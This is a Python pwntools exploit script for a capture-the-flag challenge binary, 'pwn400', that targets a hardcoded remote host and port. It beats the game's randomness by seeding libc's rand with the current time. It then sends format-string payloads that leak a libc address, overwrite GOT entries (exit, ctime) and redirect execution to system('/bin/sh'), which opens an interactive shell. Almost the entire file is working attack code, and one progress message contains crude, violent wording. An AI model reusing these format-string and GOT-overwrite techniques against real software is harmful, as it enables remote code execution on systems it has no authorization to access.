#!/usr/bin/env python

from pwn import *
import time
import datetime
from ctypes import *
import sys
libc = CDLL("libc.so.6") #load libc

#========================= REMOTE
host = '167.88.114.217'
port = 31337
 #=================================


def playerTurn(p, choice, bet, _log):
    s = log.progress("PlayerTurn!\n")
    p.sendline(str(choice))
    log.success('Attacked %s successful!\n' %(choice))
    p.sendlineafter('>>', str(bet))
    log.success('Choiced Bet %d!\n' %(bet))
    s.success("playerTurned!\n")


def bossTurn(p, choice, _log):
    stt = log.progress("BossTurn!\n")
    p.sendlineafter('>>', str(choice))
    stt.success("bossTurned!\n")


def useSkill():
    p.sendline('5')
    log.success("UsedSkill!")

def gettime():
    month = {'Oct':'10'}
    dis = 0

    #p.recvuntil('RIP DATE: ')
    date = str(_log[-21:]).split()
    print date
    timestring = str(date[3])
    timestring += "-"
    timestring += str(month[date[0]])
    timestring += "-"
    timestring += str(date[1])
    timestring += "-"
    timestring += str(date[2])

    timestamp = datetime.datetime.strptime(timestring, '%Y-%m-%d-%H:%M:%S')
    dis = time.mktime(timestamp.timetuple()) - time.time()
    return dis



def exploit(p, offset):
    sp = log.progress("Spawning shell... \n")

    write1 = {address['ctime']: address['system'], address['seed']: address['sh']}
    ulti = fmtstr_payload(offset, write1)
    log.success("System: %#x\nsh: %#x\nfflush: %#x" %(address['system'], address['sh'], fflush))
    p.sendline(ulti)

    log.success("Send Ulti-payload successful!\n")
    check = 3



def callback(p, _log):
    call = log.progress("Callbacking...\n")

    write = {address['exit']: address['callback']}

    payload = "%59$p"
    payload += "PAD"
    payload += fmtstr_payload(9, write, numbwritten=13)
    log.info("len of payload: %d" %(len(payload)))

    p.send(payload)


    p.recvuntil('name:')
    leak = int(p.recv(10), 16) - 247
    log.info("leak %#x\n" %(leak))
    address['system'] = leak + offset['system']
    address['sh'] = leak + offset['sh']
    log.success("System: %#x\nsh: %#x" %(address['system'], address['sh']))
    check = 2
    call.success("Callback and leak libc successful!\n")

def make_random_sequence(seed):
    libc.srand(int(seed))



if len(sys.argv) > 1:
    p = remote(host, port)
    _libc = ELF('./pwn400')
    seed = time.time()
else:
    p = process('./pwn400', aslr=True)
    _libc = ELF('./pwn400')
    seed = time.time()

address = dict()
offset = dict()

offset['system'] = 0x22860#system offset
offset['sh'] = 0x14346b#bin/sh
offset['leakfmt'] = 9
offset['leaklibc'] = 7

address['ctime'] = 0x0804B01C
address['seed'] = 0x0804B068
address['exit'] = 0x0804B028
address['callback'] =0x08048694


flag = 1
_log = ""
count = 0
check = 1
_log = p.recvuntil("Your HP")
_log = p.recv(100)
log.info("Log: %s" %(_log))

make_random_sequence(seed)

while flag:
    a = log.progress("Fucking...Raping.. Round %d\n" %(count))

    if "YOU attack" in _log:
        playerTurn(p, ((libc.rand()%3)+1), 9, _log)  #(ctytes.rand(seed) %3)
        _log = p.recvuntil('Your HP')
        log.info("LogActivity: %s" %(_log))
        _log = p.recv(100)
        log.info("Log after playerturn for if: %s" %(_log))

    if "BOSS attack" in _log:
        bossTurn(p, ((libc.rand()%3)+1), _log) #(ctytes.rand(seed) %3)
        _log = p.recvuntil('Your HP')
        log.info("LogActivity: %s" %(_log))
        _log = p.recvuntil('1.')
        log.info("Log after bossturn for if: %s" %(_log))

    if "RIP LOSER!" in _log:
        log.info("RIP LOSER! ENDGAME\n")
        flag = 0

    if "User Skill" in _log:
        useSkill()
        _log = p.recv(100)
        print _log
        if "Skill Attacked!" in _log:
            log.info("skill attack!")
            _log = p.recv(100)
            _log += "BOSS attack"
        elif "Not" in _log:
            log.info("mana")
            _log += "YOU attack"

        log.info("Log after useSkill for if: %s" %(_log))

    if "BOSS DEAD!" in _log:
        ex = log.progress("Exploiting...\n")
        #gdb.attach(p, """
        #    b *0x8048984
        #""")

        if check == 3:
            s = log.progress("Trying to catch flag..\n")
            p.interactive()

        if check == 2:
            exploit(p, offset['leaklibc'])
        if check ==1:
            callback(p, _log)
            _log = p.recvuntil("User")
            log.info("Log after callback: %s\n" %(_log))

        _log += p.recv(50)
    log.info("GAMELog: %s" %(_log))
    log.info("How many round? %d" %(count))

    count += 1


#ACEBEAR{I_d0nt_think_s0}
